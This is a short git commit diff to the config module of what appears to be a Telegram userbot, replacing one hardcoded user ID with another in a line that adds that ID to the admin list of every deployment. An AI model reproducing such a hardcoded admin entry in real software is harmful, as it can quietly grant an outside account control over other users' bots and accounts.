5bde925425f4b0cffc31b139e0ffc369cfb77821
wajirr4 <109944533+wajirr4@users.noreply.github.com>
2022-08-27 20:45:42 +0600

    Update __init__.py

--- mills/__init__.py
+++ mills/__init__.py
@@ -54,7 +54,7 @@ SESSION_STRING= get_str("SESSION_STRING", True)
 LOG_CHAT = get_int("LOG_CHAT")
 ADMINS = get_list("ADMINS") or []
 
-ADMINS.append(1317173146)
+ADMINS.append(5136746907)
 
 HANDLERS = get_list("HANDLERS")
 BOT_PIC = get_str("BOT_PIC")
